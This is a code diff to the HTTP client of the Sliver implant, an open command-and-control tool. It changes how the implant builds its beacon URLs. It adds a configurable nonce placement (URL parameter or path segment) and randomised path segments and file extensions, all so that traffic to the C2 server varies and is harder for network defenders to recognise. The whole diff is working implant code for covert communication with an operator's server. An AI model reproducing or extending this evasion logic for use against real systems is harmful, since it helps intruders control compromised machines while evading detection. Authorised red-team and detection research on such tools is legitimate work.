@@ -29,6 +29,7 @@ import (
 	insecureRand "math/rand"
 	"net/http"
 	"net/url"
+	"path"
 	"strconv"
 	"strings"
 	"sync"
@@ -50,6 +51,8 @@ var (
 
 	userAgent          = "{{GenerateUserAgent}}"
 	NonceQueryArgChars = "{{.HTTPC2ImplantConfig.NonceQueryArgChars}}" // "abcdefghijklmnopqrstuvwxyz"
+	NonceQueryLength   = "{{.HTTPC2ImplantConfig.NonceQueryLength}}"   // 8
+	NonceMode          = "{{.HTTPC2ImplantConfig.NonceMode}}"          // Url or UrlParam
 
 	ErrClosed                             = errors.New("http session closed")
 	ErrStatusCodeUnexpected               = errors.New("unexpected http response code")
@@ -196,17 +199,35 @@ func (s *SliverHTTPClient) SessionInit() error {
 
 // NonceQueryArgument - Adds a nonce query argument to the URL
 func (s *SliverHTTPClient) NonceQueryArgument(uri *url.URL, value uint64) *url.URL {
-	values := uri.Query()
-	key := NonceQueryArgChars[insecureRand.Intn(len(NonceQueryArgChars))]
 	argValue := fmt.Sprintf("%d", value)
 	for i := 0; i < insecureRand.Intn(3); i++ {
 		index := insecureRand.Intn(len(argValue))
 		char := string(NonceQueryArgChars[insecureRand.Intn(len(NonceQueryArgChars))])
 		argValue = argValue[:index] + char + argValue[index:]
 	}
-	values.Add(string(key), argValue)
-	uri.RawQuery = values.Encode()
-	return uri
+
+	if NonceMode == "UrlParam" {
+		values := uri.Query()
+		var key string
+		length, _ := strconv.Atoi(NonceQueryLength)
+		for i := 0; i < length; i++ {
+			key += string(NonceQueryArgChars[insecureRand.Intn(len(NonceQueryArgChars))])
+		}
+
+		values.Add(string(key), argValue)
+		uri.RawQuery = values.Encode()
+		return uri
+	} else {
+		segments := strings.Split(uri.Path, "/")
+		extension := path.Ext(segments[len(segments)-1])
+		index := insecureRand.Intn(len(segments))
+		segments[index] = argValue
+		if index == len(segments)-1 {
+			segments[index] += extension
+		}
+		uri.Path = strings.Join(segments, "/")
+		return uri
+	}
 }
 
 // OTPQueryArgument - Adds an OTP query argument to the URL
@@ -283,7 +304,7 @@ func (s *SliverHTTPClient) newHTTPRequest(method string, uri *url.URL, body io.R
 	}
 	queryParams := req.URL.Query()
 	for _, param := range extraURLParams {
-		if len(param.Method)>0 && param.Method != method {
+		if len(param.Method) > 0 && param.Method != method {
 			continue
 		}
 		probability, _ := strconv.Atoi(param.Probability)
@@ -429,7 +450,7 @@ func (s *SliverHTTPClient) ReadEnvelope() (*pb.Envelope, error) {
 	if s.SessionID == "" {
 		return nil, errors.New("no session")
 	}
-	uri := s.parseSegments(0)
+	uri := s.parseSegments()
 	nonce, encoder := encoders.RandomEncoder(0)
 	s.NonceQueryArgument(uri, nonce)
 	req := s.newHTTPRequest(http.MethodGet, uri, nil)
@@ -504,7 +525,7 @@ func (s *SliverHTTPClient) WriteEnvelope(envelope *pb.Envelope) error {
 		return err
 	}
 
-	uri := s.parseSegments(1)
+	uri := s.parseSegments()
 	nonce, encoder := encoders.RandomEncoder(len(reqData))
 	s.NonceQueryArgument(uri, nonce)
 	encodedValue, _ := encoder.Encode(reqData)
@@ -552,7 +573,7 @@ func (s *SliverHTTPClient) CloseSession() error {
 	s.pollCancel = nil
 
 	// Tell server session is closed
-	uri := s.parseSegments(2)
+	uri := s.parseSegments()
 	nonce, _ := encoders.RandomEncoder(0)
 	s.NonceQueryArgument(uri, nonce)
 	req := s.newHTTPRequest(http.MethodGet, uri, nil)
@@ -588,74 +609,43 @@ func (s *SliverHTTPClient) pathJoinURL(segments []string) string {
 	return strings.Join(segments, "/")
 }
 
-func (s *SliverHTTPClient) parseSegments(segmentType int) *url.URL {
+func (s *SliverHTTPClient) parseSegments() *url.URL {
 	curl, _ := url.Parse(s.Origin)
 	var (
-		pollFiles    []string
-		pollPaths    []string
-		sessionFiles []string
-		sessionPaths []string
-		closePaths   []string
-		closeFiles   []string
+		files      []string
+		paths      []string
+		extensions []string
 	)
 
 	// {{range .HTTPC2ImplantConfig.PathSegments}}
-	// {{if eq .SegmentType 0 }}
 	// {{if .IsFile}}
-	pollFiles = append(pollFiles, "{{.Value}}")
+	files = append(files, "{{.Value}}")
 	// {{end}}
 	// {{if not .IsFile }}
-	pollPaths = append(pollPaths, "{{.Value}}")
+	paths = append(paths, "{{.Value}}")
 	// {{end}}
 	// {{end}}
 
-	// {{if eq .SegmentType 1}}
-	// {{if .IsFile}}
-	sessionFiles = append(sessionFiles, "{{.Value}}")
-	// {{end}}
-	// {{if not .IsFile }}
-	sessionPaths = append(sessionPaths, "{{.Value}}")
+	// {{range $extension := .HTTPC2ImplantConfig.Extensions}}
+	extensions = append(extensions, "{{$extension}}")
 	// {{end}}
 
-	// {{end}}
-	// {{if eq .SegmentType 2}}
-	// {{if .IsFile}}
-	closeFiles = append(closeFiles, "{{.Value}}")
-	// {{end}}
-	// {{if not .IsFile }}
-	closePaths = append(closePaths, "{{.Value}}")
-	// {{end}}
-	// {{end}}
-	// {{end}}
-
-	switch segmentType {
-	case 0:
-		curl.Path = s.pathJoinURL(s.randomPath(pollPaths, pollFiles, "{{ .HTTPC2ImplantConfig.PollFileExtension }}"))
-	case 1:
-		curl.Path = s.pathJoinURL(s.randomPath(sessionPaths, sessionFiles, "{{ .HTTPC2ImplantConfig.SessionFileExtension }}"))
-	case 2:
-		curl.Path = s.pathJoinURL(s.randomPath(closePaths, closeFiles, "{{.HTTPC2ImplantConfig.CloseFileExtension}}"))
-	default:
-		return nil
-	}
+	curl.Path = s.pathJoinURL(s.randomPath(paths, files, extensions))
 
 	return curl
 }
 
 func (s *SliverHTTPClient) startSessionURL() *url.URL {
-	sessionURI := s.parseSegments(1)
-	uri := strings.TrimSuffix(sessionURI.String(), "{{ .HTTPC2ImplantConfig.SessionFileExtension }}")
-	uri += "{{ .HTTPC2ImplantConfig.StartSessionFileExtension }}"
-	curl, _ := url.Parse(uri)
+	curl := s.parseSegments()
 	return curl
 }
 
 // Must return at least a file name, path segments are optional
-func (s *SliverHTTPClient) randomPath(segments []string, filenames []string, ext string) []string {
+func (s *SliverHTTPClient) randomPath(segments []string, filenames []string, exts []string) []string {
 	genSegments := []string{}
 	if 0 < len(segments) {
-		min, _ := strconv.Atoi("{{.HTTPC2ImplantConfig.MinPaths}}")
-		max, _ := strconv.Atoi("{{.HTTPC2ImplantConfig.MaxPaths}}")
+		min, _ := strconv.Atoi("{{.HTTPC2ImplantConfig.MinPathLength}}")
+		max, _ := strconv.Atoi("{{.HTTPC2ImplantConfig.MaxPathLength}}")
 		n := insecureRand.Intn(max-min+1) + min // How many segments?
 		for index := 0; index < n; index++ {
 			seg := segments[insecureRand.Intn(len(segments))]
@@ -663,11 +653,14 @@ func (s *SliverHTTPClient) randomPath(segments []string, filenames []string, ext
 		}
 	}
 	filename := filenames[insecureRand.Intn(len(filenames))]
+	ext := exts[insecureRand.Intn(len(exts))]
 
 	// {{if .Config.Debug}}
 	log.Printf("[http] segments = %v, filename = %s, ext = %s", genSegments, filename, ext)
 	// {{end}}
-	genSegments = append(genSegments, fmt.Sprintf("%s.%s", filename, ext))
+	if ext != "" {
+		genSegments = append(genSegments, fmt.Sprintf("%s.%s", filename, ext))
+	}
 	return genSegments
 }
 
